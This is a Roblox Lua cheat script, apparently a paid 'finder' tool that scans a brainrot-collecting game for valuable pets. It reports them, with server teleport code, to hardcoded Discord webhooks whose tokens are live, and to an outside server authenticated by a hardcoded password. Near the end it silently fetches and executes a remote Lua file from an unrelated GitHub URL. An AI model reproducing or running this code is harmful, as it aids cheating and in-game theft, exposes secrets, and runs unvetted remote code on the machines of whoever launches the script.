local Players = game:GetService('Players')
local HttpService = game:GetService('HttpService')
local Workspace = game:GetService("Workspace")

local localPlayer = Players.LocalPlayer

local VDS_SEND_PASSWORD = "send_546564reaqw452151523333"
local VDS_URL = "https://auroranotifier.pro"
local SECRET = "g45hAT436262155453"

local sentCache = {}

local function newTable(n)
    return table.create and table.create(n) or {}
end

local bxor = bit32 and bit32.bxor or bit.bxor

local function xorBytes(str, key)
    local out = newTable(#str)
    local keyLen = #key
    for i = 1, #str do
        local c = string.byte(str, i)
        local k = string.byte(key, (i - 1) % keyLen + 1)
        out[i] = string.char(bxor(c, k))
    end
    return table.concat(out)
end

local function toHex(str)
    local t = newTable(#str * 2)
    for i = 1, #str do
        t[i] = string.format("%02X", string.byte(str, i))
    end
    return table.concat(t)
end

local function EncryptJobId(jobId)
    local x = xorBytes(jobId, SECRET)
    return toHex(x)
end

local WEBHOOKS = {
    {
        url = 'https://discord.com/api/webhooks/1454372752034365566/EmLdd5U_wxp6Ziy8gAAiGB7MHpeWPaDBZzS8vfAQSD2dWsB0ZyPAEfDYK0n869ObblnT',
        title = '🟢 Low Income (1-25M/s)',
        color = 0x00ff00,
        min = 1_000_000,
        max = 25_000_000,
        sendServerInfo = false,
        sendTeleport = true
    },
    {
        url = 'https://discord.com/api/webhooks/1456399330662682714/1HTEJNBTO1qhXMex8-5YBB1_Q5ekmyHtgvUJ886zitqpl6IC_aXhjKb5QgpjXns1s4uh',
        title = '🟡 Medium Income (26-100M/s)',
        color = 0xffff00,
        min = 26_000_000,
        max = 100_000_000,
        sendServerInfo = false,
        sendTeleport = false,
        showJoinerAd = true
    },
    {
        url = 'https://discord.com/api/webhooks/1456399389336801463/kyZ8kGtNnSL3Ee1YJteiCWdKWA_KlVFdUNEVAAWr9_kkwGJc6r-3Xg7D8w56aUxRfa1q',
        title = '🔴 High Income (101M+ /s)',
        color = 0xff0000,
        min = 101_000_000,
        max = 10_000_000_000,
        sendServerInfo = false,
        sendTeleport = false,
        showJoinerAd = true
    },
    {
        url = 'https://discord.com/api/webhooks/1457015322119897133/kQkqA4AMYLVviEYFT7Rf4Udz6ATSRYPVcPeDtALzHFfveew7jmjGCPE6Q-5KAZViCaIE',
        title = '⭐️ SPECIAL BRAINROTS + MUTATIONS',
        color = 0xff00ff,
        special = true,
        sendServerInfo = false,
        sendTeleport = true
    }
}

local SPECIAL_BRAINROTS = {
    ['Dragon Cannelloni'] = { min = 0, mutations = {} },
}

local OBJECTS = {
    ['La Vacca Saturno Saturnita'] = { emoji = '🐄', important = false },
    ['Chimpanzini Spiderini'] = { emoji = '🕷️', important = false },
    ['Los Tralaleritos'] = { emoji = '🎵', important = false },
    ['Las Tralaleritas'] = { emoji = '🎶', important = false },
    ['Graipuss Medussi'] = { emoji = '🐍', important = false },
    ['Torrtuginni Dragonfrutini'] = { emoji = '🐢', important = false },
    ['Pot Hotspot'] = { emoji = '🔥', important = false },
    ['La Grande Combinasion'] = { emoji = '🌟', important = true },
    ['Garama and Madundung'] = { emoji = '🍝', important = true },
    ['Secret Lucky Block'] = { emoji = '🎲', important = false },
    ['Dragon Cannelloni'] = { emoji = '🐲', important = true },
    ['Nuclearo Dinossauro'] = { emoji = '☢️', important = true },
    ['Las Vaquitas Saturnitas'] = { emoji = '🐮', important = false },
    ['Agarrini la Palini'] = { emoji = '🤹', important = false },
    ['Los Hotspotsitos'] = { emoji = '⚡', important = true },
    ['Esok Sekolah'] = { emoji = '🏫', important = true },
    ['Nooo My Hotspot'] = { emoji = '📶', important = false },
    ['La Supreme Combinasion'] = { emoji = '👑', important = true },
    ['Admin Lucky Block'] = { emoji = '🔒', important = false },
    ['Ketupat Kepat'] = { emoji = '🍙', important = true },
    ['Strawberry Elephant'] = { emoji = '🐘', important = true },
    ['Spaghetti Tualetti'] = { emoji = '🚽', important = true },
    ['Ketchuru and Musturu'] = { emoji = '🍾', important = true },
    ['La Secret Combinasion'] = { emoji = '🕵️', important = true },
    ['La Karkerkar Combinasion'] = { emoji = '🤖', important = false },
    ['Los Bros'] = { emoji = '👊', important = true },
    ['La Extinct Grande'] = { emoji = '💀', important = true },
    ['Las Sis'] = { emoji = '👭', important = true },
    ['Tacorita Bicicleta'] = { emoji = '🌮', important = true },
    ['Tictac Sahur'] = { emoji = '⏰', important = true },
    ['Celularcini Viciosini'] = { emoji = '📱', important = true },
    ['Los Primos'] = { emoji = '👬', important = true },
    ['Tang Tang Keletang'] = { emoji = '🥁', important = true },
    ['Money Money Puggy'] = { emoji = '💰', important = true },
    ['Burguro And Fryuro'] = { emoji = '🍔', important = true },
    ['Chillin Chili'] = { emoji = '🌶️', important = true },
    ['Eviledon'] = { emoji = '😈', important = true },
    ['La Spooky Grande'] = { emoji = '👻', important = true },
    ['Los Mobilis'] = { emoji = '🚗', important = true },
    ['Spooky and Pumpky'] = { emoji = '🎃', important = true },
    ['Mieteteira Bicicleteira'] = { emoji = '🚴', important = true },
    ['Meowl'] = { emoji = '🐱', important = true },
    ['Chipso and Queso'] = { emoji = '🧀', important = true },
    ['La Casa Boo'] = { emoji = '👁‍🗨', important = true },
    ['Headless Horseman'] = { emoji = '👹', important = true },
    ['Mariachi Corazoni'] = { emoji = '🎺', important = true },
    ['La Taco Combinasion'] = { emoji = '🌮', important = true },
    ['Capitano Moby'] = { emoji = '⚓', important = true },
    ['Guest 666'] = { emoji = '🔥', important = true },
    ['Cooki and Milki'] = { emoji = '🍪', important = true },
    ['Los Puggies'] = { emoji = '🐶', important = true },
    ['Fragrama and Chocrama'] = { emoji = '🍫', important = true },
    ['Los Spaghettis'] = { emoji = '🍝', important = true },
    ['Los Tacoritas'] = { emoji = '🌮', important = true },
    ['Orcaledon'] = { emoji = '🐋', important = true },
    ['Lavadorito Spinito'] = { emoji = '🌀', important = true },
    ['Los Planitos'] = { emoji = '🛫', important = true },
    ['W or L'] = { emoji = '🏆', important = true },
    ['Fishino Clownino'] = { emoji = '🐠', important = true },
    ['Chicleteira Noelteira'] = { emoji = '🍬', important = true },
    ['La Jolly Grande'] = { emoji = '🎁', important = true },
    ['Los Chicleteiras'] = { emoji = '🍭', important = true },
    ['Gobblino Uniciclino'] = { emoji = '🦃', important = true },
    ['Los 67'] = { emoji = '🎰', important = true },
    ['Los Spooky Combinasionas'] = { emoji = '💀', important = true },
    ['Swag Soda'] = { emoji = '🥤', important = true },
    ['Los Combinasionas'] = { emoji = '🧩', important = true },
    ['Los Burritos'] = { emoji = '🌯', important = true },
    ['67'] = { emoji = '🎲', important = true },
    ['Rang Ring Bus'] = { emoji = '🚌', important = true },
    ['Los Nooo My Hotspotsitos'] = { emoji = '📡', important = true },
    ['Chicleteirina Bicicleteirina'] = { emoji = '🚲', important = true },
    ['Noo My Candy'] = { emoji = '🍬', important = true },
    ['Los Quesadillas'] = { emoji = '🫓', important = true },
    ['Quesadillo Vampiro'] = { emoji = '🧛', important = true },
    ['Quesadilla Crocodila'] = { emoji = '🐊', important = true },
    ['Ho Ho Ho Sahur'] = { emoji = '🎅', important = true },
    ['Horegini Boom'] = { emoji = '💥', important = true },
    ['Pot Pumpkin'] = { emoji = '🎃', important = true },
    ['Pirulitoita Bicicleteira'] = { emoji = '🍭', important = true },
    ['La Sahur Combinasion'] = { emoji = '🌙', important = true },
    ['List List List Sahur'] = { emoji = '📋', important = true },
    ['Noo My Examine'] = { emoji = '📘', important = true },
    ['Cuadramat and Pakrahmatmamat'] = { emoji = '🧮', important = true },
    ['Los Cucarachas'] = { emoji = '🪳', important = true },
    ['1x1x1x1'] = { emoji = '💾', important = true },
    ['La Ginger Sekolah'] = { emoji = '🎁', important = true },
    ['Reinito Sleighito'] = { emoji = '🦌', important = true },
    ['Swaggy Bros'] = { emoji = '🥤', important = true },
    ['Gingerbread Dragon'] = { emoji = '🥠', important = true },
    ['Naughty Naughty'] = { emoji = '🦥', important = true },
    ['Chimnino'] = { emoji = '🌽', important = true },
    ['Noo my Present'] = { emoji = '🎁', important = true },
    ['Los Candies'] = { emoji = '🍬', important = true },
    ['Santa Hotspot'] = { emoji = '🎄', important = true },
    ['Festive 67'] = { emoji = '🎄', important = true },
    ['Burrito Bandito'] = { emoji = '🌯', important = true },
    ['Perrito Burrito'] = { emoji = '🐶', important = true },
    ['Trickolino'] = { emoji = '😢', important = true },
    ['La Vacca Jacko Linterino'] = { emoji = '🎃', important = true },
    ['Los Karkeritos'] = { emoji = '🪑', important = true },
    ['Karker Sahur'] = { emoji = '🥁', important = true },
    ['job job job Sahur'] = { emoji = '📜', important = true },
    ['Frankentteo'] = { emoji = '🧟', important = true },
    ['Pumpkini Spyderini'] = { emoji = '🎃', important = true },
    ['Yess My Examine'] = { emoji = '✅', important = true },
    ['Guerriro Digitale'] = { emoji = '⌨️', important = true },
    ['Boatito Auratito'] = { emoji = '🚤', important = true },
    ['Los Tortus'] = { emoji = '🐢', important = true },
    ['Zombie Tralala'] = { emoji = '🧟', important = true },
    ['Vulturino Skeletono'] = { emoji = '🦅', important = true },
    ['La Cucaracha'] = { emoji = '🪳', important = true },
    ['Extinct Tralalero'] = { emoji = '🦴', important = true },
    ['Fragola La La La'] = { emoji = '🍓', important = true },
    ['Los Spyderinis'] = { emoji = '🕷', important = true },
    ['Blackhole Goat'] = { emoji = '🐐', important = true },
    ['Chachechi'] = { emoji = '🗣', important = true },
    ['Dul Dul Dul'] = { emoji = '🐒', important = true },
    ['Sammyni Spyderini'] = { emoji = '🕷', important = true },
    ['Jackorilla'] = { emoji = '🦍', important = true },
    ['Trenostruzzo Turbo 4000'] = { emoji = '🚄', important = true },
    ['Karkerkar Kurkur'] = { emoji = '🪑', important = true },
    ['Los Matteos'] = { emoji = '🕶', important = true },
    ['Bisonte Giuppitere'] = { emoji = '🦬', important = true },
    ['Los 25'] = { emoji = '💀', important = true },
    ['25'] = { emoji = '💄', important = true },
    ['Dragon Gingerini'] = { emoji = '🐍', important = true },
    ['Donkeyturbo Express'] = { emoji = '🍩', important = true },
    ['Money Money Reindeer'] = { emoji = '💶', important = true },
    ['Jolly Jolly Sahur'] = { emoji = '🥶', important = true },
    ['Los Jolly Combinasionas'] = { emoji = '🗽', important = true },
    ['Ginger Gerat'] = { emoji = '🥶', important = true },
    ['Skibidi Toilet'] = { emoji = '🚽', important = true },
    ['Tuff Toucan'] = { emoji = '🦜', important = true },
    ['Bunito Bunito Spinito'] = { emoji = '🐰', important = true },
    ['Tung Tung Tung Sahur'] = { emoji = '🌳', important = true },
    ['Bunnyman'] = { emoji = '🐇', important = true },
    ['Please my Present'] = { emoji = '🎁', important = true },
    ['Giftini Spyderini'] = { emoji = '🕷', important = true },
    ['Cerberus'] = { emoji = '👹', important = true },
    ['Ay Mi Gatito'] = { emoji = '😻', important = true },
    ['AY MI GATITO MIAU MIAU'] = { emoji = '😻', important = true },
}

local ALWAYS_IMPORTANT = {}
for name, cfg in pairs(OBJECTS) do
    if cfg.important then
        ALWAYS_IMPORTANT[name] = true
    end
end

local function findAllPetMutations()
    local plots = workspace.Plots:GetChildren()
    local petMutations = {}
    for _, plot in ipairs(plots) do
        if plot:IsA("Folder") or plot:IsA("Model") then
            for _, descendant in ipairs(plot:GetDescendants()) do
                if descendant:IsA("Model") and descendant:GetAttribute("Mutation") then
                    table.insert(petMutations, {
                        PlotId = plot.Name,
                        PetName = descendant.Name,
                        Mutation = descendant:GetAttribute("Mutation")
                    })
                end
            end
        end
    end
    return petMutations
end

local function parseGenerationText(s)
    if type(s) ~= 'string' or s == '' then return nil end
    local norm = s:gsub('%$', ''):gsub(',', ''):gsub('%s+', '')
    local num, suffix = norm:match('^([%-%d%.]+)([KkMmBb]?)/s$')
    if not num then return nil end
    local val = tonumber(num)
    if not val then return nil end
    local mult = 1
    if suffix == 'K' or suffix == 'k' then mult = 1e3
    elseif suffix == 'M' or suffix == 'm' then mult = 1e6
    elseif suffix == 'B' or suffix == 'b' then mult = 1e9
    end
    return val * mult
end

local function formatIncomeNumber(n)
    if not n then return 'Unknown' end
    if n >= 1e9 then
        local v = n / 1e9
        return (v % 1 == 0 and string.format('%dB/s', v) or string.format('%.1fB/s', v)):gsub('%.0B/s', 'B/s')
    elseif n >= 1e6 then
        local v = n / 1e6
        return (v % 1 == 0 and string.format('%dM/s', v) or string.format('%.1fM/s', v)):gsub('%.0M/s', 'M/s')
    elseif n >= 1e3 then
        local v = n / 1e3
        return (v % 1 == 0 and string.format('%dK/s', v) or string.format('%.1fK/s', v)):gsub('%.0K/s', 'K/s')
    else
        return string.format('%d/s', n)
    end
end

local function grabText(inst)
    if not inst then return nil end
    if inst:IsA('TextLabel') or inst:IsA('TextButton') or inst:IsA('TextBox') then
        local ok, ct = pcall(function() return inst.ContentText end)
        if ok and type(ct) == 'string' and #ct > 0 then return ct end
        local t = inst.Text
        if type(t) == 'string' and #t > 0 then return t end
    end
    if inst:IsA('StringValue') then
        local v = inst.Value
        if type(v) == 'string' and #v > 0 then return v end
    end
    return nil
end

local function getOverheadInfo(animalOverhead)
    if not animalOverhead then return nil, nil end
    local name = nil
    local display = animalOverhead:FindFirstChild('DisplayName')
    if display then name = grabText(display) end
    if not name then
        local anyText = animalOverhead:FindFirstChildOfClass('TextLabel')
            or animalOverhead:FindFirstChildOfClass('TextButton')
            or animalOverhead:FindFirstChildOfClass('TextBox')
        name = anyText and grabText(anyText) or nil
    end
    local genText = nil
    local generation = animalOverhead:FindFirstChild('Generation')
    if generation then genText = grabText(generation) end
    if not genText then
        for _, child in ipairs(animalOverhead:GetDescendants()) do
            if child:IsA('TextLabel') or child:IsA('TextButton') or child:IsA('TextBox') then
                local text = grabText(child)
                if text and (text:match('%$') or text:match('/s')) then
                    genText = text
                    break
                end
            end
        end
    end
    return name, genText
end

local function isGuidName(s)
    return s:match('^[0-9a-fA-F]+%-%x+%-%x+%-%x+%-%x+$') ~= nil
end

local function scanPlots()
    local results = {}
    local Plots = Workspace:FindFirstChild('Plots')
    if not Plots then return results end
    for _, plot in ipairs(Plots:GetChildren()) do
        local Podiums = plot:FindFirstChild('AnimalPodiums')
        if Podiums then
            for _, podium in ipairs(Podiums:GetChildren()) do
                local Base = podium:FindFirstChild('Base')
                local Spawn = Base and Base:FindFirstChild('Spawn')
                local Attachment = Spawn and Spawn:FindFirstChild('Attachment')
                local Overhead = Attachment and Attachment:FindFirstChild('AnimalOverhead')
                if Overhead then
                    local name, genText = getOverheadInfo(Overhead)
                    local genNum = genText and parseGenerationText(genText) or nil
                    if name and genNum then
                        table.insert(results, { name = name, gen = genNum, location = 'Plot' })
                    end
                end
            end
        end
    end
    return results
end

local function scanRunway()
    local results = {}
    for _, obj in ipairs(Workspace:GetChildren()) do
        if isGuidName(obj.Name) then
            local part = obj:FindFirstChild('Part')
            local info = part and part:FindFirstChild('Info')
            local overhead = info and info:FindFirstChild('AnimalOverhead')
            if overhead then
                local name, genText = getOverheadInfo(overhead)
                local genNum = genText and parseGenerationText(genText) or nil
                if name and genNum then
                    table.insert(results, { name = name, gen = genNum, location = 'Runway' })
                end
            end
        end
    end
    return results
end

local function scanAllOverheads()
    local results, processed = {}, {}
    local descendants = Workspace:GetDescendants()
    for _, child in ipairs(descendants) do
        if child.Name == 'AnimalOverhead' and not processed[child] then
            processed[child] = true
            local name, genText = getOverheadInfo(child)
            local genNum = genText and parseGenerationText(genText) or nil
            if name and genNum then
                table.insert(results, { name = name, gen = genNum, location = 'World' })
            end
        end
    end
    return results
end

local function scanPlayerGui()
    local results = {}
    local playerGui = localPlayer:FindFirstChild('PlayerGui')
    if not playerGui then return results end
    local function searchInGui(parent)
        for _, child in ipairs(parent:GetChildren()) do
            if child.Name == 'AnimalOverhead' or child.Name:match('Animal') then
                local name, genText = getOverheadInfo(child)
                local genNum = genText and parseGenerationText(genText) or nil
                if name and genNum then
                    table.insert(results, { name = name, gen = genNum, location = 'GUI' })
                end
            end
            pcall(function() searchInGui(child) end)
        end
    end
    searchInGui(playerGui)
    return results
end

local function scanDebrisFolder()
    local results = {}
    local DebrisFolder = Workspace:FindFirstChild("Debris")
    if not DebrisFolder then return results end
    for _, inst in ipairs(DebrisFolder:GetChildren()) do
        if inst.Name == "FastOverheadTemplate" then
            local gui = inst:FindFirstChild("GUI")
            if gui then
                local nameInst = gui:FindFirstChild("DisplayName")
                local genInst = gui:FindFirstChild("Generation")
                local name = nameInst and grabText(nameInst) or nil
                local genText = genInst and grabText(genInst) or nil
                local genNum = genText and parseGenerationText(genText) or nil
                if name and genNum then
                    table.insert(results, { name = name, gen = genNum, location = 'DebrisFolder' })
                end
            end
        end
    end
    return results
end

local function collectAll(timeoutSec)
    local t0 = os.clock()
    local collected = {}
    repeat
        collected = {}
        local allSources = { scanPlots(), scanRunway(), scanAllOverheads(), scanPlayerGui(), scanDebrisFolder() }
        for _, source in ipairs(allSources) do
            for _, item in ipairs(source) do
                table.insert(collected, item)
            end
        end
        local seen, unique = {}, {}
        for _, item in ipairs(collected) do
            local key = item.name .. ':' .. tostring(item.gen) .. ':' .. (item.location or '')
            if not seen[key] then
                seen[key] = true
                table.insert(unique, item)
            end
        end
        collected = unique
        if #collected > 0 then break end
        task.wait(0.5)
    until os.clock() - t0 > timeoutSec
    return collected
end

local function shouldShow(name, gen)
    if ALWAYS_IMPORTANT[name] then return true end
    return (type(gen) == 'number') and gen >= 1_000_000
end

local function hasRequiredMutation(name, mutation)
    local brainrotConfig = SPECIAL_BRAINROTS[name]
    if not brainrotConfig then return false end
    local mutations = brainrotConfig.mutations or {}
    if #mutations == 0 then return false end
    for _, requiredMutation in ipairs(mutations) do
        if mutation == requiredMutation then
            return true
        end
    end
    return false
end

local function isSpecialBrainrot(name, gen, mutation)
    local brainrotConfig = SPECIAL_BRAINROTS[name]
    if not brainrotConfig then return false end
    local minValue = brainrotConfig.min
    if mutation and hasRequiredMutation(name, mutation) then
        return true
    end
    return gen >= minValue
end

local function getRequester()
    return http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (KRNL_HTTP and KRNL_HTTP.request)
end

local VDS_TOKEN_CACHE = {
    token = nil,
    expiresAt = 0
}

local function GetVDSToken()
    local req = getRequester()
    if not req then return nil end
    local now = os.time()
    if VDS_TOKEN_CACHE.token and VDS_TOKEN_CACHE.expiresAt > (now + 300) then
        return VDS_TOKEN_CACHE.token
    end
    local success, response = pcall(function()
        return req({
            Url = VDS_URL .. "/auth/send",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({password = VDS_SEND_PASSWORD})
        })
    end)
    if success and response and response.StatusCode == 200 then
        local ok, data = pcall(function()
            return HttpService:JSONDecode(response.Body)
        end)
        if ok and data and data.token then
            VDS_TOKEN_CACHE.token = data.token
            VDS_TOKEN_CACHE.expiresAt = math.floor((data.expiresAt or (now * 1000 + 3600000)) / 1000)
            return data.token
        end
    end
    return nil
end

local function sendToVDS(filteredObjects, webhookConfig)
    local req = getRequester()
    if not req then return end
    if #filteredObjects == 0 then return end
    local token = GetVDSToken()
    if not token then return end
    local encryptedJobId = EncryptJobId(tostring(game.JobId))
    local payload = {
        jobId = encryptedJobId,
        placeId = game.PlaceId,
        title = webhookConfig.title,
        color = webhookConfig.color,
        range = { min = webhookConfig.min, max = webhookConfig.max },
        special = webhookConfig.special or false,
        sendServerInfo = webhookConfig.sendServerInfo or false,
        time = os.time(),
        objects = {},
    }
    for _, obj in ipairs(filteredObjects) do
        table.insert(payload.objects, {
            name = obj.name,
            gen = obj.gen,
            location = obj.location,
            mutation = obj.mutation or nil,
            important = ALWAYS_IMPORTANT[obj.name] or false,
            isSpecial = isSpecialBrainrot(obj.name, obj.gen, obj.mutation),
        })
    end
    pcall(function()
        return req({
            Url = VDS_URL .. "/brainrot",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["X-Aurora-Token"] = token,
                ["X-Aurora-Role"] = "send"
            },
            Body = HttpService:JSONEncode(payload),
        })
    end)
end

local function sendDiscordNotificationByRange(filteredObjects, webhookConfig, allowVDS)
    local req = getRequester()
    if not req then return end
    if #filteredObjects == 0 then return end
    local jobId = game.JobId
    local placeId = game.PlaceId
    local important, regular = {}, {}
    for _, obj in ipairs(filteredObjects) do
        if ALWAYS_IMPORTANT[obj.name] then
            table.insert(important, obj)
        else
            table.insert(regular, obj)
        end
    end
    table.sort(important, function(a, b) return a.gen > b.gen end)
    table.sort(regular, function(a, b) return a.gen > b.gen end)
    local sorted = {}
    for _, obj in ipairs(important) do table.insert(sorted, obj) end
    for _, obj in ipairs(regular) do table.insert(sorted, obj) end
    local objectsList = {}
    for i = 1, math.min(15, #sorted) do
        local obj = sorted[i]
        local emoji = OBJECTS[obj.name] and OBJECTS[obj.name].emoji or '💰'
        local mark = ALWAYS_IMPORTANT[obj.name] and '⭐️ ' or ''
        local locationMark = obj.location == 'DebrisFolder' and ' 🔥' or ''
        local overpayMark = ''
        local mutationMark = ''
        if webhookConfig.special and SPECIAL_BRAINROTS[obj.name] then
            local brainrotConfig = SPECIAL_BRAINROTS[obj.name]
            local minVal = brainrotConfig.min
            if obj.mutation then
                mutationMark = string.format(' 🎨 **%s**', obj.mutation)
            end
            if obj.gen > minVal then
                overpayMark = string.format(' 🔥 **OVERPAY** (min: %s)', formatIncomeNumber(minVal))
            end
        end
        table.insert(objectsList, string.format('%s%s **%s** (%s)%s%s%s', mark, emoji, obj.name, formatIncomeNumber(obj.gen), mutationMark, overpayMark, locationMark))
    end
    local objectsText = table.concat(objectsList, '\n')
    local descriptionText = webhookConfig.special
        and string.format('⭐️ Found %d special brainrots!', #filteredObjects)
        or string.format('💎 Found %d objects in range!', #filteredObjects)
    local rangeText = webhookConfig.special
        and '**All from special list + mutations**'
        or string.format('**%s - %s**', formatIncomeNumber(webhookConfig.min), formatIncomeNumber(webhookConfig.max))
    local fields = {
        { name = '📊 Income range', value = rangeText, inline = true },
        { name = '💰 Objects:', value = objectsText, inline = false },
    }
    if webhookConfig.sendServerInfo then
        table.insert(fields, 1, { name = '🆔 Server (Job ID)', value = tostring(jobId), inline = true })
    end
    if webhookConfig.sendTeleport then
        local teleportLua = string.format("local ts = game:GetService('TeleportService');\nts:TeleportToPlaceInstance(%d, '%s')", placeId, jobId)
        table.insert(fields, { name = '🚀 Teleport code:', value = teleportLua, inline = false })
    elseif webhookConfig.showJoinerAd then
        table.insert(fields, {
            name = '💎 Want convenience and see the server?',
            value = 'Buy Joiner here: https://discord.com/channels/1448597315207299126/1449995006315204891',
            inline = false,
        })
    end
    local payload = {
        username = 'AURORA FINDER',
        embeds = { {
            title = webhookConfig.title,
            description = descriptionText,
            color = webhookConfig.color,
            fields = fields,
            footer = { text = string.format('Found: %d • %s', #filteredObjects, os.date('%H:%M:%S')) },
            timestamp = DateTime.now():ToIsoDate(),
        } },
    }
    pcall(function()
        return req({
            Url = webhookConfig.url,
            Method = 'POST',
            Headers = { ['Content-Type'] = 'application/json' },
            Body = HttpService:JSONEncode(payload),
        })
    end)
    if allowVDS then
        sendToVDS(filteredObjects, webhookConfig)
    end
end

local function generateCacheKey(obj)
    return obj.name .. ':' .. tostring(obj.gen) .. ':' .. (obj.mutation or 'none')
end

local function filterNewObjects(objects)
    local newObjects = {}
    for _, obj in ipairs(objects) do
        local key = generateCacheKey(obj)
        if not sentCache[key] then
            sentCache[key] = true
            table.insert(newObjects, obj)
        end
    end
    return newObjects
end

local function scanAndNotify()
    local allFound = collectAll(2.0)
    local mutations = findAllPetMutations()
    local mutationMap = {}
    for _, pet in ipairs(mutations) do
        mutationMap[pet.PetName] = pet.Mutation
    end
    for _, obj in ipairs(allFound) do
        obj.mutation = mutationMap[obj.name]
    end
    local groups = {{}, {}, {}, {}}
    local hasSpecial = false
    for _, obj in ipairs(allFound) do
        if OBJECTS[obj.name] and shouldShow(obj.name, obj.gen) and type(obj.gen) == 'number' then
            if isSpecialBrainrot(obj.name, obj.gen, obj.mutation) then
                hasSpecial = true
                table.insert(groups[4], obj)
            end
        end
    end
    local allowVDS = not hasSpecial
    if hasSpecial then
        local newObjects = filterNewObjects(groups[4])
        if #newObjects > 0 then
            sendDiscordNotificationByRange(newObjects, WEBHOOKS[4], false)
        end
        return
    end
    for _, obj in ipairs(allFound) do
        if OBJECTS[obj.name] and shouldShow(obj.name, obj.gen) and type(obj.gen) == 'number' then
            if obj.gen >= WEBHOOKS[1].min and obj.gen <= WEBHOOKS[1].max then
                table.insert(groups[1], obj)
            elseif obj.gen >= WEBHOOKS[2].min and obj.gen <= WEBHOOKS[2].max then
                table.insert(groups[2], obj)
            elseif obj.gen >= WEBHOOKS[3].min and obj.gen <= WEBHOOKS[3].max then
                table.insert(groups[3], obj)
            end
        end
    end
    for i, group in ipairs(groups) do
        if #group > 0 and i ~= 4 then
            local newObjects = filterNewObjects(group)
            if #newObjects > 0 then
                sendDiscordNotificationByRange(newObjects, WEBHOOKS[i], allowVDS)
            end
        end
    end
end

scanAndNotify()

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/dsfsdfs21cfc/yrhgnjrtyjh333/refs/heads/main/Vhposhpohosh0p.lua"))()
end)

while true do
    task.wait(2)
    scanAndNotify()
end
